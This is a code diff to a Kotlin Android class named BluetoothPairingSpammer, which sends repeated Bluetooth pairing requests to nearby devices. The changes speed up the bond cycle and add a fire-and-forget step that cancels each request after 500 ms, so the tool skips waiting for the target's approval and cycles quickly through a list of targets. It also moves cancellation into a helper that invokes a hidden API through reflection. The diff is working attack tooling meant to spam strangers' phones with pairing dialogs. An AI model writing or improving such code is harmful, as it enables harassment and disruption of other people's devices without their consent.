@@ -31,7 +31,8 @@ class BluetoothPairingSpammer {
 
     companion object {
         private const val TAG = "BtPairingSpam"
-        private const val BOND_CYCLE_DELAY_MS = 2000L
+        private const val BOND_CYCLE_DELAY_MS = 800L
+        private const val BOND_FIRE_DELAY_MS = 500L
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -128,7 +129,7 @@ class BluetoothPairingSpammer {
         }
     }
 
-    private fun sendPairingRequest(device: BluetoothDevice) {
+    private suspend fun sendPairingRequest(device: BluetoothDevice) {
         val address = device.address
         try {
             // Re-assert custom name before EVERY bond attempt
@@ -142,15 +143,10 @@ class BluetoothPairingSpammer {
             if (bondState == BluetoothDevice.BOND_BONDED) {
                 Log.d(TAG, "Removing existing bond with $address")
                 removeBond(device)
-                Thread.sleep(300)
+                delay(300)
             } else if (bondState == BluetoothDevice.BOND_BONDING) {
-                // Cancel ongoing bonding attempt to restart it
-                try {
-                    val cancelMethod = device.javaClass.getMethod("cancelBondProcess")
-                    cancelMethod.invoke(device)
-                    Log.d(TAG, "Cancelled ongoing bond with $address")
-                    Thread.sleep(300)
-                } catch (_: Exception) { }
+                cancelBond(device)
+                delay(300)
             }
 
             // createBond() triggers the pairing dialog on the target device
@@ -158,11 +154,24 @@ class BluetoothPairingSpammer {
             Log.d(TAG, "Sending pairing request to $address (bond=$bondState, name='${adapter?.name}')")
             val result = device.createBond()
             Log.d(TAG, "createBond($address) returned: $result")
+
+            // Fire-and-forget: cancel bond after short delay so we don't wait
+            // for user approval — allows fast iteration over a list of targets
+            delay(BOND_FIRE_DELAY_MS)
+            cancelBond(device)
         } catch (e: SecurityException) {
             Log.w(TAG, "SecurityException sending pairing to $address", e)
         } catch (e: Exception) {
             Log.w(TAG, "Error sending pairing to $address: ${e.message}", e)
         }
+    }
+
+    private fun cancelBond(device: BluetoothDevice) {
+        try {
+            val cancelMethod = device.javaClass.getMethod("cancelBondProcess")
+            cancelMethod.invoke(device)
+            Log.d(TAG, "Cancelled bond with ${device.address}")
+        } catch (_: Exception) { }
     }
 
     /**
